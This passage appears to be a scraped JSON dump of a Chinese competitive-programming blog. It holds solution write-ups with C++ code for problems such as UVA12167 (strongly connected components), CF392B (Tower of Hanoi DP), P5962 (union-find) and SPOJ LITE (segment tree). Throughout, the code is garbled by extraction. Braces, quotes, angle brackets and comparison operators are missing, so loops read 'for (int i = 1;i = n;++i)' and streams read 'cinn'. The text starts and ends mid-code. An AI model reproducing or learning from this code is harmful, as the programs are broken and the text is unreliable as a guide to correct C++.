cstring#define ll long longusing namespace std;const int MAX = 1005;int a[MAX][MAX],n,m;ll dp[MAX][MAX][2];int main () freopen (number.in,r,stdin); freopen (number.out,w,stdout); //dp[i][j][0] means from (1,1) to (n,m); //dp[i][j][1] means from (n,m) to (1,1). memset (dp,0x80,sizeof (dp)); scanf (%d%d,n,m); for (int i = 1;i = n;++i) for (int j = 1;j = m;++j) scanf (%d,a[i][j]); dp[1][1][1] = dp[1][1][0] = a[1][1]; dp[n][m][1] = dp[n][m][0] = a[n][m]; for (int i = 2;i = n;++i) dp[i][1][0] = dp[i - 1][1][0] + a[i][1]; for (int i = n - 1;i = 1;--i) dp[i][m][1] = dp[i + 1][m][1] + a[i][m]; for (int i = 2;i = m;++i) for (int j = 1;j = n;++j)//left dp[j][i][0] = dp[j][i][1] = max (dp[j][i - 1][0],dp[j][i - 1][1]) + a[j][i]; for (int j = 2;j = n;++j)//down dp[j][i][0] = max (dp[j][i][0],dp[j - 1][i][0] + a[j][i]); for (int j = n - 1;j = 1;--j)//up dp[j][i][1] = max (dp[j][i][1],dp[j + 1][i][1] + a[j][i]); printf (%lld ,max (dp[n][m][0],dp[n][m][1])); return 0;","categories":["Journal"]},{"title":"题解：[ABC064D] Insertion","path":"/2020/11/01/ABC064D/","content":"读入整个字符串后统计 ( 与 ) 的个数是多少。 现在设左右括号需要再添加的个数为 $l,r$。 若读入一个 ( 则说明需要加上一个 ) 才能完整配对，即 ++r。 若读入一个 ) 则说明需要加上一个 ) 才能完整配对，此时有两种情况：$l = 0$ 则说明需要增加 ( 个数，即 ++l；$l 0$ 则说明一组括号已配对，--l 即可。 最后先输出增加的 $l$ 个 (，然后输出原字符串，最后输出增加的 $r$ 个 )。 代码： #include iostream#include cstdiousing namespace std;int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); int n,l = 0,r = 0; string str; cinnstr; for (int i = 0;i n;++i) if (str[i] == () ++r;//增加右括号数量 if (str[i] == ))//需要左括号 if (r 0) --r;//成功配对，增加的右括号数量减少 else ++l;//增加左括号数量 for (int i = 1;i = l;++i) cout(; coutstr; for (int i = 1;i = r;++i) cout); coutendl; return 0;","categories":["Solution"]},{"title":"题解：UVA12167 Proving Equivalences","path":"/2020/10/19/UVA12167/","content":"将问题可以进行转化：求一张 $n$ 个点 $m$ 条边的有向图上还需要增加几条边才可以使图强连通。 由于是一张有向图，所以我们需要求出强连通分量，然后进行缩点并记录出度或入度为 $0$ 的点的个数，最后两者取 $\\max$ 输出答案。 但需要注意的点有两个： 若原图只有 $1$ 个强连通分量，则需要特判输出 $0$。 原图不保证连通，因此进行 dfs 的时候需要循环扫一遍。 给个代码： #include iostream#include cstdio#include stack#include cstring#define init(x) memset (x,0,sizeof (x))using namespace std;const int MAXN = 1e5 + 5;int t,n,m,cnt,times,scc_cnt,num1,num2;int dfn[MAXN],low[MAXN],vis[MAXN],in[MAXN],out[MAXN];int head[MAXN 1],to[MAXN 1],nxt[MAXN 1];stack int s;void _add (int u,int v);void tarjan (int u);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); scanf (%d,t); while (t--) cnt = times = scc_cnt = num1 = num2 = 0; init (dfn);init (low);init (vis);init (in);init (out); init (head);init (to);init (nxt); scanf (%d%d,n,m); for (int i = 1;i = m;++i) int x,y;scanf (%d%d,x,y); _add (x,y); for (int i = 1;i = n;++i) if (!dfn[i]) tarjan (i); for (int i = 1;i = n;++i)//缩点 for (int j = head[i];j;j = nxt[j]) int v = to[j]; if (vis[i] != vis[v])//不在同一个强连通分量中 ++out[vis[i]],++in[vis[v]]; if (scc_cnt == 1) printf (0 ); continue; for (int i = 1;i = scc_cnt;++i) if (!in[i]) ++num1; if (!out[i]) ++num2; printf (%d ,max (num1,num2)); return 0;void _add (int u,int v) to[++cnt] = v; nxt[cnt] = head[u]; head[u] = cnt;void tarjan (int u) low[u] = dfn[u] = ++times; s.push (u); for (int i = head[u];i;i = nxt[i]) int v = to[i]; if (!dfn[v]) tarjan (v); low[u] = min (low[u],low[v]); else if (!vis[v]) low[u] = min (low[u],dfn[v]);//对于已经求出 scc 的点，直接忽略 if (low[u] == dfn[u])//u 是强连通分量中第一个被发现的点 ++scc_cnt; while (1) int x = s.top ();s.pop (); vis[x] = scc_cnt; if (x == u) break;","categories":["Solution"]},{"title":"题解：SP16185/UVA1108 BUSINESS - Mining your own business","path":"/2020/10/01/SPOJ16185/","content":"将题目进行转化：在图中安装若干个太平井后，使得任意删除一个点，每个点双连通分量中都之后有一个太平井。 由题意可知，安装太平井，肯定与割点有关。因此，我们先求出无向图中的割点。 void dfs (int u,int fa) low[u] = dfn[u] = ++times;//时间戳 int child = 0; for (int i = head[u];i;i = nxt[i]) int v = to[i]; if (!dfn[v]) ++child; dfs (v,u); low[u] = min (low[u],low[v]); if (dfn[u] = low[v])//为割点 iscut[u] = 1; else if (v != fa dfn[v] dfn[u])//反向边 low[u] = min (low[u],dfn[v]); if (fa 0 child == 1) iscut[u] = 0;//特殊情况 把所有边双向存入后，调用 dfs (1,-1)，然后根据 iscut[i] 的布尔值判断该点是否为割点。 点双连通分量与割点数量的关系决定了安装太平井的数量，所以我们在求割点的同时也要记录每一个点双连通分量。 这里我们可以使用 set int 变量名，在记录每一个元素的同时也可以将相同的元素去除。在 dfs (u,fa) 函数的基础上修改一下即可，结合注释，代码应该很好理解。 void dfs (int u,int fa) low[u] = dfn[u] = ++times;//时间戳 int child = 0; for (int i = head[u];i;i = nxt[i]) int v = to[i]; if (!dfn[v]) ++child; st.push (i);//加入元素 dfs (v,u); low[u] = min (low[u],low[v]); if (dfn[u] = low[v])//为割点 iscut[u] = 1; ++bcc_cnt;//点双连通分量的数量 while (1) int x = st.top ();st.pop (); con[bcc_cnt].insert (dis[x]);//两条相邻的边加入其中 con[bcc_cnt].insert (to[x]); if (dis[x] == u to[x] == v) break;//退出循环的条件 else if (v != fa dfn[v] dfn[u])//反向边 st.push (i);//加入元素 low[u] = min (low[u],dfn[v]); if (fa 0 child == 1) iscut[u] = 0;//特殊情况 最后就是答案的求解了，对于一个点双连通分量有以下的情况： 全部连通，割点数为 $0$。此时若连接点坍塌，需要 $2$ 个太平井才能符合要求。设连通块大小为 $sz$，则任意选择两个点的方案数为 $C_{sz}^{2} = \\frac{sz \\times (sz - 1)}{2}$。 割点数为 $1$。此时若连接点坍塌，只需要 $1$ 个太平井才能符合要求。设连通块大小为 $sz$，则任意选择一个的方案数为 $sz - 1$。 割点数大于 $1$。此时易得若缺少一个割点，该点双连通分量仍然联通，因此不需要安装。 部分代码如下，注意需要使用乘法原理，且需要注意变量的类型。 ull ans1 = 0,ans2 = 1;//注意类型 for (int i = 1;i = bcc_cnt;++i) ull num = 0,sz = 0; for (set int :: iterator j = con[i].begin ();j != con[i].end ();++j) ++sz;//该连通块的大小 if (iscut[*j]) ++num;//割点数量 if (num == 0) ans1 += 2,ans2 *= sz * (sz - 1) / 2;//为 0 的情况 else if (num == 1) ++ans1,ans2 *= (sz - 1);//为 1 的情况 写在最后的话： 由于为多组数据，每次得出答案后记得初始化。 若有问题，及时提出，记得点个赞再走哦qwq！","categories":["Solution"]},{"title":"题解：P3208 [HNOI2010]矩阵","path":"/2020/09/13/P3208/","content":"这道题不难发现是一道搜索题 + 找规律题。 首先根据题意，可以发现若矩阵第一行与第一列被确定，那么整个矩阵中的元素也就能被一一确定。所以每个元素很可能可以根据第一行与第一列上的元素推导出来。需要注意的一点就是 $a[1][1]$ 这个元素，因为它是行与列的相交处。 继续进行推导，设 $s[i][j]$ 表示给定和中的每一项，$a[i][j]$ 表示所求的答案，$f[i][j]$ 表示一个值，即 $f[i][j] = s[i][j] - f[i - 1][j] - f[i][j - 1] - f[i - 1][j - 1]$。 则有： f[i][j] = a[i][j] + (-1)^i \\times a[1][j] + (-1) ^ j \\times a[i][1] + (-1) ^ {i + j} \\times a[1][1]因此，我们想要确定一个字典序最小的矩阵，只需要每一行的行首最小。记录的时候可以根据每一个位置的答案范围来记录 ($l-r$)。 完整代码就不给了，放个伪代码吧： //dx - dy 表示符合条件的取值范围 int work (int x,int y,int value) if (x % 2 == 1) value += s[1][y]; else value -= s[1][y]; if (y % 2 == 1) value += s[x][1]; else value -= s[x][1]; if ((x + y) % 2 == 1) value += s[1][1]; else value -= s[1][1]; //do sth.bool dfs (int x) //return for (int i = 0;i p;++i) s[1][x] = i; bool ok = 1; for (int j = 2;j = n;++j) int tmp = work (j,x,a[j][x]); if (x % 2 == 1) dx[x][j] = max (dx[x - 1][j],-tmp); dy[x][j] = min (dy[x - 1][j],p - 1 - tmp); else dx[x][j] = max (dx[x - 1][j],tmp + 1 - p); dy[x][j] = min (dy[x - 1][j],tmp); if (dx[x][j] = p || dx[x][j] dy[x][j])// 不符合条件 ok = 0; break; //do sth. //return","categories":["Solution"]},{"title":"题解：UVA10183 How Many Fibs?","path":"/2020/08/28/UVA10183/","content":"对于一个 C++ 选手，一看数据范围就知道要用高精度来写。 先来考虑一个弱化版 满足 $a,b \\le 10^8$。 因为要求出两数之间的斐波那契数的个数，所以我们可以预处理出 $10^8$ 以内的斐波那契数。 f[1] = 1,f[2] = 1;for (...) 递推过程 然后就是找到第一项 $\\ge a,b$ 的斐波那契数，并记录它的项数，然后相减就能得出答案。根据数据范围很容易排除暴力搜索，因此我们可以采用效率更高的二分答案。 设一共有 $n$ 个斐波那契数，要求出与第一项 $\\ge m$ 的斐波那契数。因此可以将第 $k$ 项斐波那契数分成三种情况： $f[k] m$，继续在 $1 \\sim k$ 的范围内查找； $f[k] = m$，返回 $k$； $f[k] m$，继续在 $k + 1 \\sim n$ 的范围内查找。 进阶版高精度 满足 $a,b \\le 10^{100}$。 有了上述的思路，就可以考虑用高精度来改写以上算法了，但不管怎么说，核心还是不会变的。 首先是改预处理的部分，递推时直接使用高精度的加法，用一个二维数组记录就可以了。 其次是二分的部分，这部分应该不需要太大的改动，只需要注意两个参数第 $k$ 项斐波那契数和与其比较的数字。 最后就是比较的部分，按照字符串的比较方法，逐位进行比较即可！ Tips： 高精度加法与判断大小时需要考虑前导 $0$ 的影响 需要注意某一项斐波那契数就是 $a$ 或 $b$ 时对答案产生的影响 本题有多组测试数据，记得输出后对部分数据进行清空操作 代码#include iostream#include string#include cstringusing namespace std;const int MAX = 550;string a,b;int lena[MAX],lenb[MAX],f[MAX][MAX],ans;bool ok;void pre ();int work (int len[]);int cmp (int len[],int x);int main () pre (); while (1)//多组数据 string a,b; cinab;//字符串输入 if (a == 0 b == 0) break; memset (lena,0,sizeof (lena)); memset (lenb,0,sizeof (lenb)); ok = ans = 0; for (int i = 0;i a.size ();++i) lena[a.size () - i] = a[i] - 0; for (int i = 0;i b.size ();++i) lenb[b.size () - i] = b[i] - 0; int da = work (lena); if (ok) ans = 1;//特殊情况 int db = work (lenb); ans += db - da; coutansendl; return 0;void pre ()//预处理部分 f[1][1] = 1;f[2][1] = 2; for (int i = 3;i = 500;++i)//高精度预处理出数列的每一项 for(int j = 1;j = 150;++j) f[i][j] += f[i - 1][j] + f[i - 2][j]; if (f[i][j] 9)//进位处理 f[i][j + 1] += f[i][j] / 10; f[i][j] %= 10; int work (int len[]) //找到与 len 最近的一项 int l = 1,r = 500; while (l = r)//二分比较两者长度 int mid = (l + r) 1; if (cmp (len,mid) == 0)//两数相等 ok = 1;//len 就是这一项 return mid; else if (cmp (len,mid) == 1) r = mid - 1;//第 mid 项较大 else l = mid + 1; return l - 1;int cmp (int len[],int x) //0 1 2 分别表示相等，len 小，len 大 int ka = 150,kb = 150; while (len[ka - 1] == 0) --ka;//前导 0 while (f[x][kb - 1] == 0) --kb; if (ka kb) return 1; else if (ka kb) return 2; else for (int i = ka;i = 1;--i) if (len[i] f[x][i]) return 2; if (len[i] f[x][i]) return 1; return 0;","categories":["Solution"]},{"title":"题解：CF385B Bear and Strings","path":"/2020/08/16/CF385B/","content":"这道题需要求字符串的子串中包含 bear 的个数。 最简单的算法是枚举子串的起始位置与结束位置，如果包含 bear，就将答案的数量 $+1$。但是分析复杂度可知，两层循环加上字符串的截取与查找，是无法通过总长度 $s = 5000$ 的，因此我们就要考虑每一个 bear 字串对答案的贡献。 for (int i = 0;i str.size ();++i) for (int j = i + 1;j str.size ();++j) string _n = str.substr (i,j - i + 1); if (_n.find(bear) != -1) ans++; 遍历整个序列，如果查找到 bear，就会对后面的子串产生影响。从第 $i$ 位查找到最后，如果包含 bear，那么只要另外子串包含这个 bear，那么就会是答案增加。但同时要记得去除重复计算的部分，因此就有：枚举到第 $i$ 位，若包含 bear(从第 $i$ 位到最后)，则答案会增加整个字符串的长度 $- i - 3 - $ bear 第一次出现的位置。这样就减少了一层循环，可以通过此题。 #include iostream#include string#include cstdiousing namespace std;int main () string str;int ans = 0; cinstr; for (register int i = 0;i str.size ();++i) string d1 = str.substr (i,str.size () - i); if (d1.find(bear) != -1) ans += str.size() - i - 3 - d1.find(bear); printf (%d ,ans); return 0;","categories":["Solution"]},{"title":"题解：CF392B Tower of Hanoi","path":"/2020/08/07/CF392B/","content":"不妨设 $dp[i][j][k]$ 表示 $i$ 个圆盘从第 $j$ 杆移动到第 $k$ 杆的最小花费。现在要求 $n$ 个在第 $1$ 杆的圆盘移动到第 $3$ 杆上，因此最终的答案就是 $dp[n][1][3]$。 根据一般汉诺塔的移动方法，想要移动 $i$ 个圆盘，就需要先解决顶上 $i - 1$ 个圆盘的移动问题。又因为汉诺塔只有 $3$ 根柱子，所以我们也可以根据这个思路取设计转移方程。假设现在有 $n$ 个圆盘在第 $1$ 杆上，需要移动到 第 $3$ 杆上，因不同的路径的花费不同，所以我们可以先将顶上 $i - 1$ 个盘子移动到第 $2$ 根或第 $3$ 根杆上，计算哪一个花费最小，如图所示： 现在设 $dis[i][j]$ 表示将圆盘从杆 $i$ 移动到杆 $j$ 需要花费的金钱数。根据手绘的垃圾图： 第一种移动方式的花费为 $n - 1$ 个盘子从 $1$ 移到 $2$ 的最小花费加上将底部的圆盘从 $1$ 移动到 $2$ 所需的花费，即 $dp[i - 1][1][2] + dis[1][2]$。 第一种移动方式分成三部分：① $i - 1$ 个盘子从 $1$ 移到 $3$，底部的圆盘从 $1$ 移动到 $2$；② $i - 1$ 个盘子从 $3$ 移到 $1$，底部的圆盘从 $2$ 移动到 $3$；③ $i - 1$ 个盘子从 $1$ 移到 $3$。把所有的花费合并起来就是：$dp[i - 1][1][3] + dis[1][2] + dp[i - 1][3][1] + dis[2][3] + dp[i - 1][1][3]$。 最后，我们把这两种不同的花费取最小值就是 $dp[i][j][k]$ 的答案。总结一下，转移方程就是：$dp[i][j][k] = \\min (dp[i - 1][j][l] + dp[i - 1][l][k] + dis[j][k],dp[i - 1][j][k] + dis[j][l] + dp[i - 1][k][j] + dis[l][k] + dp[i - 1][j][k]) (j eq k)$。($l$ 想必就是中间的一个媒介盘了) 有了转移方程，代码也就好写了，时间复杂度为 $O(n)$。 #include iostream#include cstdio#define ll long long#define l 6-j-kusing namespace std;const int MAX = 45;ll dis[4][4],dp[MAX][4][4];int main () //dp[i][j][k] i 个盘子从 j 移动到 k 的最小成本 int n; for (int i = 1;i = 3;++i) for (int j = 1;j = 3;++j) scanf (%lld,dis[i][j]); scanf (%d,n); for (int i = 1;i = n;++i) for (int j = 1;j = 3;++j) for (int k = 1;k = 3;++k) if (j == k) continue; ll da = dp[i - 1][j][l] + dp[i - 1][l][k] + dis[j][k];//移最顶上的2个到中间 ll db = dp[i - 1][j][k] + dis[j][l] + dp[i - 1][k][j] + dis[l][k] + dp[i - 1][j][k];//移最顶上的2个到第3根 dp[i][j][k] = min (da,db); printf (%lld ,dp[n][1][3]); return 0;","categories":["Solution"]},{"title":"题解：P5962 [BOI2004]ships 船","path":"/2020/07/30/P5962/","content":"这道题目让我们从大到小输出连通块的大小及其对应的个数。 首先最容易想到的是开个二维数组，然后就是很裸的搜索题目。但是一看 $n$ 的数据范围是 $1 \\le n \\le 3 \\times 10 ^ 4$，所以 $n$ 较大是肯定会 $\\texttt{MLE}$，只能拿到部分分。(应该能过前 $18$ 个点，但 $72$ 分我觉得也挺多的) 其次我们就要想着如何把二维降到一维，单纯的搜索肯定是过不去了，再次读题发现船舶总数和船舶吨位都不超过 $10^3$，这便是本题的突破口。我们可以用并查集，每次记录当前行和上一行，如果与上一行的船有相交，则将其合并。下面详细来讲该做法： $\\textbf{输入}$ 题目中描述的共有两种情况：单独的一个船—用单独的一个数表示，连续的若干个船—用 x - y 的形式表示。这两个不同的情况之间用 , 隔开；行与行之间用 ; 表示结束。 for (int i = 1;i = n;++i) cinstr; if (str == ;)//该行为空行 Do something! for (int j = 0;j str.size ();++j) if (0 = str[j] str[j] = 9)//具体信息 Do something! if (str[j] == -)//分隔符 Do something! if (str[j] == , || str[j] == ;)//一个信息的结束标志 Do something! 根据以上程序，我们可以将处理输入分成四个部分(四个 if 语句)。 如果该行只有一个 ;，那么没有需要处理的船，直接跳过即可。 如果遇到数字，那么转化成 int 类型进行存储。 如果遇到分隔符 -，说明有连续一段，标记并记录 - 左边的数 a = num。 如果遇到结束的标志 , 或 ;，根据之前的标记进行判断是一个数还是一段区间，然后记录下来 a = b = num 或是 b = num(此处 $a$ 在分隔符的位置已经记录下来) $\\textbf{判断相交}$ 不难发现应该在第四个 if 语句中操作。开两个数组分别记录最新连通块的结点与大小，并开一个记录每个起始位置与终止位置的结构体。 fa[++cnt] = cnt,sz[cnt] = b - a + 1;//结点与大小_now[++k] = a,b,cnt;//结点为 cnt 的连通块的信息 然后就是判断与上一行有无相交，有相交就直接合并，用 while 循环就能解决。 //kk 上一行的结点个数//be[i] 上一行的信息 b[i].f,b[i].s,b[i].tmp 分别表示终止，起始与结点//w 从 1 开始循环while (w = kk be[w].f a) ++w;//与上一行没有相交 while (w = kk be[w].s = b) _union (_now[k].tmp,be[w].tmp),++w;//有相交就合并 当然，在 $i$ 循环的时候每一次都要复制一遍上一行的信息，如果当前行为 ; 则需要清空上一行的信息。(因为下一行对应的是当前行空行，一定没有相交) $\\textbf{并查集操作}$ 合并：如果不是同一个父亲结点上的就把结点与连通块数量一起合并。 int dx = find (x),dy = find (y);if (dx != dy) fa[dy] = dx,sz[dx] += sz[dy];//合并 查询：递归式查找，记得保存最新的父结点信息。 int find (int x) return fa[x] == x ? x : fa[x] = find (fa[x]);//查询根结点 $\\textbf{答案的输出}$ 如果一个结点的父结点是它自己，则这个结点上的连通块数量就是一个答案(说明其它连通的结点都已经被合并)，将其记录。 for (……) if (fa[i] == i) Record it! 题目中说明最大的连通块 $\\le 10^3$，所以我们倒序循环输出即可。 for (int i = 1000;i = 1;--i) if (连通块的数量为 i 时有解) couti 连通块个数为 i 的数量endl; $\\textbf{完整的代码}$ #include iostream#include cstringusing namespace std;const int MAX = 1000005;int n,a,b,num,cnt,k,kk,w,ans[MAX],fa[MAX],sz[MAX];struct node int s,f,tmp;//起点，终点，结点序号 be[MAX],_now[MAX];bool ty;string str;void _union (int x,int y);int find (int x);int main () cinn; for (int i = 1;i = n;++i) cinstr; if (str == ;) k = 0;//清零(别忘了!!!) continue; for (int j = 1;j = k;++j) be[j] = _now[j];//上一行的记录 kk = k;//上一行的连块计数器 k = 0;//当前行的连块计数器 for (int j = 0;j str.size ();++j) w = 1; if (0 = str[j] str[j] = 9) num = num * 10 + str[j] - 0; if (str[j] == -) a = num,num = 0,ty = 1; if (str[j] == , || str[j] == ;) //ty = 0 为一整段；否则为一个点 if (ty) b = num; else a = b = num; fa[++cnt] = cnt,sz[cnt] = b - a + 1; _now[++k] = a,b,cnt; while (w = kk be[w].f a) ++w;//与上一行没有相交 while (w = kk be[w].s = b) _union (_now[k].tmp,be[w].tmp),++w;//有相交就合并 a = b = num = ty = 0; //for (int j = 1;j = k;++j) cout_now[j].s and _now[j].f ; //coutendl; //for (int j = 1;j = kk;++j) coutbe[j].s and be[j].f ; //coutendl; for (int i = 1;i = cnt;++i) if (fa[i] == i) ++ans[sz[i]];//说明这个是根结点 for (int i = 1000;i = 1;--i)//船舶总数和船舶吨位都不超过 10^3 if (ans[i]) couti ans[i]endl; return 0;void _union (int x,int y) int dx = find (x),dy = find (y); if (dx != dy) fa[dy] = dx,sz[dx] += sz[dy];//合并 int find (int x) return fa[x] == x ? x : fa[x] = find (fa[x]);//查询根结点","categories":["Solution"]},{"title":"题解：P6686 混凝土数学","path":"/2020/07/27/P6686/","content":"可以看得出来这是一道组合数求解问题。 $30pts$直接暴力枚举三条边的长度，复杂度为 $Θ(n^3)$。 $50pts$当所有长度全部相等时，等腰三角形的个数为 $\\dbinom{n}{3}$，直接特判输出；其余情况仍然暴力枚举。 $80pts$题目强调需要构成等腰三角形，我们将所有能组成三角形的分成两类：等边与等腰。 先给输入的木棍的长度去一下重，并记录每一边长的木棍数量。然后将不重复的长度排一个序。对于等边三角形，直接按上述方法求解；对于普通的等腰三角形，两层循环进行枚举，设两条边长为 $b[i],b[j]$ 以及该长度的木棍数量为 $num[i],num[j]$。如果以 $b[i]$ 为腰，则需要满足 $b[i] \\times 2 b[j]$ 且 $num[j] \\ge 2$；若以 $b[i]$ 为底，则需要满足 $num[j] \\ge 2$ 即可。 则答案有 $\\sum^k_{i = 1} \\dbinom{num[i]}{3} + \\sum^k_{i = 1} \\sum^k_{j = i + 1} \\dbinom{num[i]}{2} \\times num[j] + \\dbinom{num[j]}{2} \\times num[i]$。($num[i],num[j],b[i],b[j]$ 要确保满足上述条件) 时间复杂度为 $Θ(n^2)$，还有最后一个部分无法通过。 for (int i = 1;i = k;++i) if(vis[b[i]] = 3) ans += c[vis[b[i]]][3],ans %= mod;//等边 for (int i = 1;i = k;++i) for (int j = i + 1;j = k;++j) if(2 * b[i] = b[j]) break; if(2 * b[i] b[j] vis[b[i]] = 2) ans += c[vis[b[i]]][2] * vis[b[j]],ans %= mod;//a,a,b a多次出现 for (int j = i + 1;j = k;++j) if(vis[b[j]] = 2) ans += c[vis[b[j]]][2] * vis[b[i]],ans %= mod;//a,a,b b多次出现 $100pts$考虑将程序进行优化，用前缀和来维护木棍长度为 $i$ 时，小于等于第 $i$ 根木棍的长度的数量。这样预处理后，时间复杂度就变为 $Θ(n)$。优化后的代码如下：#include iostream#include cstdio#include algorithm#define mod 998244353#define ll long longusing namespace std;const int MAX = 200005;ll vis[MAX 1],a[MAX],b[MAX],c[MAX][5],s[MAX 1],ans,n,k;//数组记得开到最大值的 2 倍，否则在计算两边之和是否大于第三边时会 REint main () //用杨辉三角计算组合数 c[0][0] = c[1][0] = c[1][1] = 1; for (int i = 2;i = 200000;++i) c[i][0] = 1;//初始化 for (int j = 1;j = min (i,3);++j) c[i][j] = (c[i - 1][j - 1] + c[i - 1][j]) % mod; scanf (%lld,n); for (int i = 1;i = n;++i) scanf (%lld,a[i]); if (!vis[a[i]]) b[++k] = a[i];//去重 vis[a[i]]++;//记录数量 sort (b + 1,b + 1 + k);//排序 for (int i = 1;i MAX 1;++i) s[i] = s[i - 1] + vis[i];//前缀和进行预处理 for (int i = 1;i = k;++i) if(vis[b[i]] = 3) ans += c[vis[b[i]]][3],ans %= mod;//等边 ans += c[vis[b[i]]][2] * (s[b[i] * 2 - 1] - vis[b[i]]),ans %= mod; printf (%lld ,ans); return 0;","categories":["Solution"]},{"title":"题解：P6685 可持久化动态仙人掌的直径问题","path":"/2020/07/27/P6685/","content":"题意： 求 $1 \\le x \\le \\sqrt[m]{n}$，正整数解 $x$ 的个数。 方法一：利用 cmath 函数库应该可以 $Θ(1)$ 解决掉此题。 方法二：快速幂 $+$ 枚举。 方法三：现在考虑用二分来做，$l = 1,r = n$，然后每次求出 $x^m$ 判断与 $n$ 的大小进行二分。需要注意的是，当 $mid = 1$ 要格外注意，若计算 $1^{10^9}$ 循环会超时，所以只要特判即可。代码如下： #include iostream#include cstdiousing namespace std;int main () int n,m; scanf (%d%d,n,m); int l = 1,r = n; while (l = r) int mid = (l + r) 1; long long ans = 1;bool ok = 1;//注意开 long long for (int i = 1;i = m;++i) if (mid == 1) break;//为 1 的情况特判 ans *= mid; if (ans n)//分界线判断 ok = 0; break; if (!ok) r = mid - 1; else l = mid + 1; coutl - 1endl; return 0;","categories":["Solution"]},{"title":"题解：SP7259 LITE - Light Switching","path":"/2020/07/19/SPOJ7259/","content":"读完题目应该就能发现是一道线段树的板子题目。 这道题目共有两个操作： 在一段区间内，把所有开的灯关了，再把关的灯打开。 在一段区间内，求开的灯的个数 对于第一个操作，也就是 $0 \\to 1,1 \\to0$，是不是很容易想到 ^。我们可以开两个数组，一个用于维护开的灯，另一个维护关的灯，分别记为 tree1 和 tree2。若有 $a$ 个灯是开的，$b$ 个灯是关的，则当进行操作一后，会有 $b$ 个灯是开的，$a$ 个灯是关的。也就是把 这两个数交换了一下。因为是区间更新，所以还要配合着标记下传的使用。标记很简单，每次异或一下就行，但需要记得最后的标记清空操作。 对于第二个操作，也就是查询操作。我们只需要查询该区间内有关 tree2 的值即可。把区间内符合条件的数组进行累加，最后输出就完事了。 完整代码： #include iostream#include cstdiousing namespace std;const int MAX = 100005;int temp[MAX 2],n,m,tree1[MAX 2],tree2[MAX 2];//tree1 维护关灯的数量，tree2 维护开灯的数量 void build (int cur,int l,int r);void ch (int cur,int l,int r,int x,int y);void pushdown (int cur);int query (int cur,int l,int r,int x,int y);int main () scanf (%d%d,n,m); build (1,1,n); for (int i = 1;i = m;++i) int type; scanf (%d,type); if (type == 0) int x,y; scanf (%d%d,x,y); ch (1,1,n,x,y); else int x,y; scanf (%d%d,x,y); printf (%d ,query (1,1,n,x,y)); return 0;void build (int cur,int l,int r) if (l == r) tree1[cur]++;//同理 tree[cur] = 1 return ; int mid = (l + r) 1; build (cur 1,l,mid);build (cur 1 | 1,mid + 1,r); tree1[cur] = tree1[cur 1] + tree1[cur 1 | 1];void ch (int cur,int l,int r,int x,int y) if (l = x r = y) temp[cur] ^= 1;//异或 swap (tree1[cur],tree2[cur]);//交换 return ; int mid = (l + r) 1; pushdown (cur); if (x = mid) ch (cur 1,l,mid,x,y); if (y mid) ch (cur 1 | 1,mid + 1,r,x,y); tree1[cur] = tree1[cur 1] + tree1[cur 1 | 1]; tree2[cur] = tree2[cur 1] + tree2[cur 1 | 1];//同时更新 void pushdown (int cur)//标记下传 if (temp[cur] == 0) return ; swap (tree1[cur 1],tree2[cur 1]); swap (tree1[cur 1 | 1],tree2[cur 1 | 1]);//交换 temp[cur 1] ^= 1,temp[cur 1 | 1] ^= 1;//异或一下 temp[cur] = 0;//清空！！！ int query (int cur,int l,int r,int x,int y) if (l = x r = y) return tree2[cur];//注意返回 tree2 的值 int mid = (l + r) 1; pushdown (cur); int ans = 0; if (x = mid) ans += query (cur 1,l,mid,x,y); if (y mid) ans += query (cur 1 | 1,mid + 1,r,x,y); return ans;","categories":["Solution"]},{"title":"题解：SP15965 ENIGMATH - PLAY WITH MATH","path":"/2020/07/11/SP15965/","content":"简单推一下这个式子！ $A \\times x - B \\times y = 0$；移项得 $A \\times x = B \\times y$；已知项为 $A,B$，我们把未知项移动到一边，则有：$\\frac{x}{y} = \\frac{B}{A}$。 欲求 $x,y$ 的最小正整数解，也就需要 $A,B$ 互质的时候，所以我们要对 $A,B$ 进行约分，约的数字即两者能同时除尽的数—最大公约数。于是就有了： $\\frac{x}{y} = \\frac{B \\div \\gcd{(A,B)}}{A \\div \\gcd{(A,B)}}$ 对于求最大公约数，用辗转相除法就可以了，在此不赘述。 所以最后，对于一组 $A,B$，就有最优解 $x = B \\div \\gcd{(A,B)},y = A \\div \\gcd{(A,B)}$。代码如下： #include iostream#include cstdiousing namespace std;int gcd (int x,int y) if (y == 0) return x; return gcd (y,x % y);int main () int t,a,b; cint; while (t--) cinab; coutb / gcd (a,b) a / gcd (a,b)endl; return 0;","categories":["Solution"]},{"title":"题解：P3139 [USACO16FEB]Milk Pails S","path":"/2020/06/27/P3139/","content":"题外话：他有三个桶 是不是应该改成 两个桶 啊 emmm。 方法： 用 $\\texttt{BFS}$ 进行搜索枚举。把三个操作分别转成数学语言即可。 接下来为了表示统一，把当前的两个桶中的牛奶设为 $(m,n)$，则应有 $0 \\le m \\le X,0 \\le n \\le Y$。 操作①：装满牛奶。很简单，只要把 $m = X$ 或 $n = Y$ 即可。两种情况分别变为 $(X,n)$ 与 $(m,Y)$。 操作②：倒空牛奶。也十分容易，把 $m = 0$ 或 $n = 0$，对应的两种情况分别变为 $(0,n)$ 与 $(m,0)$。 操作③：相互倒牛奶。这里涉及到多种的分类讨论。首先是第一个桶中的牛奶到给第二个桶中，则会出现两种情况：第一个桶倒完与未倒完(未到完即对应第二个桶已倒满)，将两种情况整理可合并成一个式子：$(m - \\min (m,Y - n),\\min (Y,n + m))$。第二大类与第一类相反，所以式子改变一下变成：$(\\min (X,n + m),n - \\min (n,X - m))$。 那么是否需要每一次操作后都将这 $8$ 大类加入到队列中去呢？肯定不需要，否则冗余的操作会使程序 $\\texttt{TLE}$。看下 $X,Y$ 的数据范围，$1 \\le X,Y \\le 100$，开个二维数组 vis[105][105]，vis[i][j] 表示两个桶分别装 $i$ 与 $j$ 的单位的牛奶的情况是否已经出现过。因此我们只需要将未出现过的情况加入到队列中去就行了。 最后就是答案的更新了，不用说，每次在取出当前队列的队首元素后进行判断更新 $ans = \\min(ans,M - |m + n|)$ 就完事了啊！ 具体实现的代码： #include iostream#include queue#include cmath #define INF 0x3f3f3f3fusing namespace std; const int MAX = 105;struct _pair int dx,dy;;bool vis[MAX][MAX];int x,y,k,m,ans = INF;queue _pair q; void search (int num);int main () cinxykm; q.push (0,0);vis[0][0] = 1;//一开始的情况 search (0); coutansendl; return 0;void search (int num) queue _pair milk;//将最新的情况压入队列 if (num == k + 1) return ;//次数已到,注意是k + 1 次 while (!q.empty ())//更新所有可能的情况 _pair now = 